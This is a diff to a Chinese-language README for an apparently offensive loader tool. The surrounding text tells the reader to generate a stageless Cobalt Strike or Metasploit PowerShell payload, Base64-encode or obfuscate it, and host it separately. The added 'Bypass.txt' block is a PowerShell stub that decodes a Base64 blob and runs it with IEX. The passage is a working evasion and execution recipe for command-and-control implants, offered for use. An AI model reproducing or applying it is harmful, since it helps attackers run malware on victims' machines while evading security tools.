@@ -91,6 +91,17 @@ python.exe .\Gllloader.py
 
 用CobaltStrike/MSF生成一个StagerLess的PowerShell脚本，用Base64加密解密一下脚本，或者用Obfuscation去混淆一下，将powershell脚本作分离处理
 
+Bypass.txt
+``` 
+$qwertyuioop=@'
+base64ENCRYPTCONTEXT
+'@
+
+$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))
+
+IEX $Decryption 
+```
+
 ![image-20220603120218705](https://user-images.githubusercontent.com/89376703/171785685-08b2e011-18c0-449b-b7c1-d2823e002aa5.png)
 
 将分离过的网址填入即可。（这边需要填一下.NET的版本，问题不大）
